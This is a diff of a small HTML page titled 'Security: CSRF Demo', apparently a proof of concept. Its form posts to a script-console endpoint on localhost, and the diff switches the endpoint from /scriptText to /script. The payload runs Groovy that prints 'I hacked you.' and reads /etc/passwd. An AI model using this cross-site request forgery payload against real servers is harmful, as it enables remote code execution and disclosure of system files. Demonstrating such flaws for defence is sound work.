@@ -1,7 +1,13 @@
 <html>
+<head>
+<title>Security: CSRF Demo</title>
+</head>
 <body>
-<form method="POST" action="http://localhost:8081/scriptText">
-<input type="text" name="script" value="println 'I hacked you.';new File('/etc/passwd').text" />
+<form method="POST" action="http://localhost:8081/script">
+<textarea name="script">
+println 'I hacked you.'
+new File('/etc/passwd').text
+</textarea>
 <input type="submit" value"Submit" />
 </form>
 </body>
